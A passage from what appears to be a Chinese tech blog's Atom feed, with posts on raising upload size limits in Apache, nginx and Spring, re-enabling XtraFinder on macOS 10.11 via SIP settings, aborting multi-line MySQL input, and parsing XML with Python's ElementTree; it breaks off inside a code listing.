body.<br>The LimitRequestBody directive allows the user to set a limit on the allowed size of an HTTP request message body within the context in which the directive is given (server, per-directory, per-file or per-location). If the client request exceeds that limit, the server will return an error response instead of servicing the request. The size of a normal request message body will vary greatly depending on the nature of the resource and the methods allowed on that resource. CGI scripts typically use the message body for retrieving form information. Implementations of the PUT method will require a value at least as large as any representation that the server wishes to accept for that resource.<br>This directive gives the server administrator greater control over abnormal client request behavior, which may be useful for avoiding some forms of denial-of-service attacks.<br>If, for example, you are permitting file upload to a particular location, and wish to limit the size of the uploaded file to 100K, you might use the following directive: LimitRequestBody 102400</p></blockquote><h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>对nginx服务器而言，相关参数为: <code>client_max_body_size</code><br>默认值为1M。</p><p>官方解释如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Syntax:client_max_body_size size;</span><br><span class="line">Default:client_max_body_size 1m;</span><br><span class="line">Context:http, server, location</span><br></pre></td></tr></table></figure><blockquote><p>Sets the maximum allowed size of the client request body, specified in the “Content-Length” request header field. If the size in a request exceeds the configured value, the 413 (Request Entity Too Large) error is returned to the client. Please be aware that browsers cannot correctly display this error. Setting size to 0 disables checking of client request body size.</p></blockquote><h3 id="2-解除应用服务器限制"><a href="#2-解除应用服务器限制" class="headerlink" title="2. 解除应用服务器限制"></a>2. 解除应用服务器限制</h3><p>java的应用程序的话，目前使用较多的还是tomcat和jetty两类服务器。<br>由于遇到的问题是nginx默认限制文件上传大小为1M导致，此类情况暂时不深研。</p><h3 id="3-解除应用自身限制"><a href="#3-解除应用自身限制" class="headerlink" title="3. 解除应用自身限制"></a>3. 解除应用自身限制</h3><p>spring容器注入multipartResolver<br>如下设置，默认不限制文件上传大小。<br>如果需要做限制的话，可以设置maxUploadSize参数，用来限制文件上传大小(单位:bytes)。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><ol><li><a href="http://craftcms.stackexchange.com/a/2330">http://craftcms.stackexchange.com/a/2330</a></li><li><a href="http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestbody">limitrequestbody</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size">client_max_body_size</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/javaee.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;h2 id=&quot;一、问题描述&quot;&gt;&lt;a href=&quot;#一、问题描述&quot; class=&quot;headerlink&quot; title=&quot;一、问题描述&quot;&gt;&lt;/a&gt;一、问题描述&lt;/h2&gt;&lt;p&gt;拍照上传图片时，系统提示: request entity too large，错误码为413。&lt;/p&gt;
&lt;h2 id=&quot;二、问题分析&quot;&gt;&lt;a href=&quot;#二、问题分析&quot; class=&quot;headerlink&quot; title=&quot;二、问题分析&quot;&gt;&lt;/a&gt;二、问题分析&lt;/h2&gt;&lt;p&gt;翻阅http状态码查看413解释如下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;413 Request entity too large&lt;br&gt;The request is larger than what the server is able to process.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由此可知，应该是上传照片超过服务器的限制。&lt;/p&gt;
&lt;h2 id=&quot;三、解决方案&quot;&gt;&lt;a href=&quot;#三、解决方案&quot; class=&quot;headerlink&quot; title=&quot;三、解决方案&quot;&gt;&lt;/a&gt;三、解决方案&lt;/h2&gt;&lt;h3 id=&quot;1-解除域名服务器限制&quot;&gt;&lt;a href=&quot;#1-解除域名服务器限制&quot; class=&quot;headerlink&quot; title=&quot;1. 解除域名服务器限制&quot;&gt;&lt;/a&gt;1. 解除域名服务器限制&lt;/h3&gt;&lt;p&gt;一般情况下，域名服务器选用apache和nginx比较多。&lt;/p&gt;
&lt;h4 id=&quot;apache&quot;&gt;&lt;a href=&quot;#apache&quot; class=&quot;headerlink&quot; title=&quot;apache&quot;&gt;&lt;/a&gt;apache&lt;/h4&gt;&lt;p&gt;对apache服务器而言，相关参数为: &lt;code&gt;LimitRequestBody&lt;/code&gt;&lt;br&gt;默认值为0，表示最大2GB。&lt;/p&gt;
&lt;p&gt;官方解释如下:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Description:	Restricts the total size of the HTTP request body sent from the client&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Syntax:	LimitRequestBody bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Default:	LimitRequestBody 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Context:	server config, virtual host, directory, .htaccess&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Override:	All&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Status:	Core&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Module:	core&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XtraFinder in 10.11</title>
    <link href="http://yeshaoting.cn/article/mac/XtraFinder%20in%2010.11/"/>
    <id>http://yeshaoting.cn/article/mac/XtraFinder%20in%2010.11/</id>
    <published>2016-07-18T06:23:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mac.png" class="img-logo img-center" /><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>MAC系统升级到10.11后，系统提示XtraFinder不可用。</p><h2 id="二、解决方案"><a href="#二、解决方案" class="headerlink" title="二、解决方案"></a>二、解决方案</h2><p>XtraFinder需要注入自己的代码到系统Finder处理过程。<br>而由于MAC 10.11开始系统默认加入了 SIP(System Integrity Protection) 机制，</p><h3 id="1-关闭SIP"><a href="#1-关闭SIP" class="headerlink" title="1. 关闭SIP"></a>1. 关闭SIP</h3><p>重启mac，在开机启动画面长按Command + R，进入恢复模式。<br>在顶部实用工具菜单，打开Terminal。<br>输入：<code>csrutil enable --without debug</code>，即可。</p><h3 id="2-恢复SIP"><a href="#2-恢复SIP" class="headerlink" title="2. 恢复SIP"></a>2. 恢复SIP</h3><p>进入恢复模式，打开Terminal。<br>输入：<code>csrutil clear</code>，即可。</p><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><ul><li><a href="https://www.trankynam.com/xtrafinder/sip.html">XtraFinder System Integrity Protection</a></li><li><a href="https://www.igorkromin.net/index.php/2015/10/06/xtrafinder-not-working-on-osx-1011-el-capitan/">XtraFinder not working on OSX 10.11 El Capitan</a></li><li><a href="http://www.jianshu.com/p/a47e96645d88">XtraFinder在 Mac OS 10.11上使用问题</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mac.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;h2 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="mac" scheme="http://yeshaoting.cn/tags/mac/"/>
    
    <category term="xtrafinder" scheme="http://yeshaoting.cn/tags/xtrafinder/"/>
    
  </entry>
  
  <entry>
    <title>中止错误的多行SQL语句执行</title>
    <link href="http://yeshaoting.cn/article/database/%E4%B8%AD%E6%AD%A2%E9%94%99%E8%AF%AF%E7%9A%84%E5%A4%9A%E8%A1%8CSQL%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C/"/>
    <id>http://yeshaoting.cn/article/database/%E4%B8%AD%E6%AD%A2%E9%94%99%E8%AF%AF%E7%9A%84%E5%A4%9A%E8%A1%8CSQL%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C/</id>
    <published>2016-05-25T12:36:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mysql.png" class="img-logo img-center" /><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>经常会出现在命令行编写多行SQL过程中，发现语法有问题。<br>此时，需要中止错误的SQL语句，取消SQL执行。</p><h2 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h2><p>编写多行SQL，中途发现语法错误，可以通过<code>\c</code>来中止。<br>如若SQL内容较多，可以通过<code>\p</code>打印出已经编写的SQL语句。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 123</span><br><span class="line">    -&gt; \p</span><br><span class="line">--------------</span><br><span class="line">select 123</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">    -&gt; \c</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="三、扩展知识"><a href="#三、扩展知识" class="headerlink" title="三、扩展知识"></a>三、扩展知识</h2><p>更多mysql命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">List of all MySQL commands:</span><br><span class="line">Note that all text commands must be first on line and end with <span class="string">&#x27;;&#x27;</span></span><br><span class="line">?         (\?) Synonym <span class="keyword">for</span> `<span class="built_in">help</span><span class="string">&#x27;.</span></span><br><span class="line"><span class="string">clear     (\c) Clear the current input statement.</span></span><br><span class="line"><span class="string">connect   (\r) Reconnect to the server. Optional arguments are db and host.</span></span><br><span class="line"><span class="string">delimiter (\d) Set statement delimiter.</span></span><br><span class="line"><span class="string">edit      (\e) Edit command with $EDITOR.</span></span><br><span class="line"><span class="string">ego       (\G) Send command to mysql server, display result vertically.</span></span><br><span class="line"><span class="string">exit      (\q) Exit mysql. Same as quit.</span></span><br><span class="line"><span class="string">go        (\g) Send command to mysql server.</span></span><br><span class="line"><span class="string">help      (\h) Display this help.</span></span><br><span class="line"><span class="string">nopager   (\n) Disable pager, print to stdout.</span></span><br><span class="line"><span class="string">notee     (\t) Don&#x27;</span>t write into outfile.</span><br><span class="line">pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.</span><br><span class="line"><span class="built_in">print</span>     (\p) Print current <span class="built_in">command</span>.</span><br><span class="line">prompt    (\R) Change your mysql prompt.</span><br><span class="line">quit      (\q) Quit mysql.</span><br><span class="line"><span class="built_in">rehash</span>    (\<span class="comment">#) Rebuild completion hash.</span></span><br><span class="line"><span class="built_in">source</span>    (\.) Execute an SQL script file. Takes a file name as an argument.</span><br><span class="line">status    (\s) Get status information from the server.</span><br><span class="line">system    (\!) Execute a system shell <span class="built_in">command</span>.</span><br><span class="line">tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.</span><br><span class="line">use       (\u) Use another database. Takes database name as argument.</span><br><span class="line">charset   (\C) Switch to another charset. Might be needed <span class="keyword">for</span> processing binlog with multi-byte charsets.</span><br><span class="line">warnings  (\W) Show warnings after every statement.</span><br><span class="line">nowarning (\w) Don<span class="string">&#x27;t show warnings after every statement.</span></span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><ul><li><a href="http://blog.sina.com.cn/s/blog_45ed26a7010002qi.html">Mysql命令中断的问题 </a></li><li><a href="https://fukun.org/archives/02291811.html">mysql命令行,多行命令时如何取消/返回修改前边的命令</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mysql.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;h2 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h2&gt;&lt;p&gt;经常会出现在命令行编写多行SQL过程中，发现语法有问题。&lt;br&gt;此时，需要中止错误的SQL语句，取消SQL执行。&lt;/p&gt;
&lt;h2 id=&quot;二、实例&quot;&gt;&lt;a href=&quot;#二、实例&quot; class=&quot;headerlink&quot; title=&quot;二、实例&quot;&gt;&lt;/a&gt;二、实例&lt;/h2&gt;&lt;p&gt;编写多行SQL，中途发现语法错误，可以通过&lt;code&gt;\c&lt;/code&gt;来中止。&lt;br&gt;如若SQL内容较多，可以通过&lt;code&gt;\p&lt;/code&gt;打印出已经编写的SQL语句。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; select 123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt; \p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select 123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt; \c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>xml.etree.ElementTree解析xml</title>
    <link href="http://yeshaoting.cn/article/python/xml.etree.ElementTree%E8%A7%A3%E6%9E%90xml/"/>
    <id>http://yeshaoting.cn/article/python/xml.etree.ElementTree%E8%A7%A3%E6%9E%90xml/</id>
    <published>2016-05-22T12:12:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><p>本文将介绍如何使用python基本类库xml.etree.ElementTree解析xml文档。</p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><h3 id="1-xml解析支持"><a href="#1-xml解析支持" class="headerlink" title="1. xml解析支持"></a>1. xml解析支持</h3><p>python标准库提供三种方法解析XML: SAX、DOM以及ElementTree。</p><h4 id="SAX-simple-API-for-XML"><a href="#SAX-simple-API-for-XML" class="headerlink" title="SAX (simple API for XML )"></a>SAX (simple API for XML )</h4><p>python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。</p><h4 id="DOM-Document-Object-Model"><a href="#DOM-Document-Object-Model" class="headerlink" title="DOM(Document Object Model)"></a>DOM(Document Object Model)</h4><p>将XML数据在内存中解析成一个树，通过对树的操作来操作XML。</p><h4 id="ElementTree-元素树"><a href="#ElementTree-元素树" class="headerlink" title="ElementTree(元素树)"></a>ElementTree(元素树)</h4><p>ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。</p><h3 id="2-ElementTree介绍"><a href="#2-ElementTree介绍" class="headerlink" title="2. ElementTree介绍"></a>2. ElementTree介绍</h3><p>xml.etree.ElementTree模块提供了一个轻量级、Pythonic的API，同时还有一个高效的C语言实现，即xml.etree.cElementTree。<br>与DOM相比，ET的速度更快，API使用更直接、方便。<br>与SAX相比，ET.iterparse函数同样提供了按需解析的功能，不会一次性在内存中读入整个文档。ET的性能与SAX模块大致相仿，但是它的API更加高层次，用户使用起来更加便捷。<br>因此，使用python解析xml时，推荐使用ElementTree这种方式。</p><span id="more"></span><h2 id="二、ElementTree详解"><a href="#二、ElementTree详解" class="headerlink" title="二、ElementTree详解"></a>二、ElementTree详解</h2><h3 id="1-类库加载"><a href="#1-类库加载" class="headerlink" title="1. 类库加载"></a>1. 类库加载</h3><p>xml.etree.ElementTree有两种实现方式:纯python实现的xml.etree.ElementTree 和 C实现的xml.etree.cElementTree.<br>C语言实现的版本，性能更加。如当前python版本包含了C语言实现的版本，优先使用。</p><p>为了兼容旧版本的python，在加载xml.etree.ElementTree时，可以通过如下方式加载类库:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    import xml.etree.cElementTree as ET</span><br><span class="line">except ImportError:</span><br><span class="line">    import xml.etree.ElementTree as ET</span><br></pre></td></tr></table></figure><h3 id="2-xml-etree-ElementTree对象"><a href="#2-xml-etree-ElementTree对象" class="headerlink" title="2. xml.etree.ElementTree对象"></a>2. xml.etree.ElementTree对象</h3><p>xml.etree.ElementTree提供了两类对象：ElementTree对象和Element对象。<br>ElementTree将整个XML文档转化为树，对整个XML文档的交互（读取，写入，查找需要的元素），一般是在ElementTree层面进行的。<br>Element则代表着树上的单个节点，对单个XML元素及其子元素，则是在Element层面进行的。</p><h3 id="3-ElementTree对象"><a href="#3-ElementTree对象" class="headerlink" title="3. ElementTree对象"></a>3. ElementTree对象</h3><h4 id="解析xml"><a href="#解析xml" class="headerlink" title="解析xml"></a>解析xml</h4><p><strong>解析xml文件</strong><br>tree = ET.parse(“cd.xml”);</p><p><strong>解析xml字符串</strong><br>tree = ET.fromstring(cd_data_as_string)</p><p><strong>注</strong>:获得的tree变量即是一个ElementTree对象。</p><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><p>getroot():获取根节点。<br>iter(tag=None):遍历当前元素及所有子元素。</p><h3 id="4-Element对象"><a href="#4-Element对象" class="headerlink" title="4. Element对象"></a>4. Element对象</h3><h4 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h4><p>每个Element对象都具有以下属性：</p><ul><li>tag：string对象，表示数据代表的种类。</li><li>attrib：dictionary对象，表示附有的属性。</li><li>text：string对象，表示element的内容。</li><li>tail：string对象，表示element闭合之后的尾迹。</li><li>若干子元素（child elements）。</li></ul><h4 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h4><p>iter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。(python2.7新特性)<br>get(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。<br>items()：根据属性字典返回一个列表，列表元素为(key, value）。<br>keys()：返回包含所有元素属性键的列表。</p><h2 id="三、解析实例"><a href="#三、解析实例" class="headerlink" title="三、解析实例"></a>三、解析实例</h2><p>打印所有<strong>艺术家</strong>的名字、打印所有CD名称及对应的售价。</p><h3 id="1-实例文档"><a href="#1-实例文档" class="headerlink" title="1. 实例文档"></a>1. 实例文档</h3><p>实例使用到的XML实例文件cd.xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Edited with XML Spy v2007 (http://www.altova.com) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CATALOG</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Empire Burlesque<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Bob Dylan<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Hide your heart<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Bonnie Tyler<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>CBS Records<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Greatest Hits<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Dolly Parton<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>RCA<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Still got the blues<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Gary Moore<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>Virgin records<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>10.20<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Eros<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Eros Ramazzotti<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>BMG<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1997<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CATALOG</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-代码"><a href="#2-代码" class="headerlink" title="2. 代码"></a>2. 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 